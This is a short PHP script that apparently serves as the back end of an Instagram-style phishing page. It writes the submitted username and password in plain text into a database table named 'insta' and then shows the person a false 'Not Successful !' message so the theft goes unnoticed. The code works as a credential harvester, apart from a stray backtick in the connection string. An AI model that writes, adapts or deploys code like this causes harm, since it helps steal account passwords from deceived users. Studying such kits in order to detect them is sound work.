<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  $servername = "localhost";
  $username = "root"; // Assuming your MySQL username is root
  $password = ""; // No password for localhost by default
  $dbname = "test2";

  try {
    $conn = new PDO("mysql:h`ost=$servername;dbname=$dbname", $username, $password);
    // Set the PDO error mode to exception
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    // Retrieve form data
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Prepare and execute SQL statement to insert data into database
    $sql = "INSERT INTO insta (username, password) VALUES (:username, :password)";
    $stmt = $conn->prepare($sql);
    $stmt->bindParam(':username', $username);
    $stmt->bindParam(':password', $password);

    $stmt->execute();
    echo "Not Successful !";
  } catch (PDOException $e) {
    echo "Error: " . $e->getMessage();
  }

  $conn = null;
} else {
  echo "Entered again !";
}
?>
